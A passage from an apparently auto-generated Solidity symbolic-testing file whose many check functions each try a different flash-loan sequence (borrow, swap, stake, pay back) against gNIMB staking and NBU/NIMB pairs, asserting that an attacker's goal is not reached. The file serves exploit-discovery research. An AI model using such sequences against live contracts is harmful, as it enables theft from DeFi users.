        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5335(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5336(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5337(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5338(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5339(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5340(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5341(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5342(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5343(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5344(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5345(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5346(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5347(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5348(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5349(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5350(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5351(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5352(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5353(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5354(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5355(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5356(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5357(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5358(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5359(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5360(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5361(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5362(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5363(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5364(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5365(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5366(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5367(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5368(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5369(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5370(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5371(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5372(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5373(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5374(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5375(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5376(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5377(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5378(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5379(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5380(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
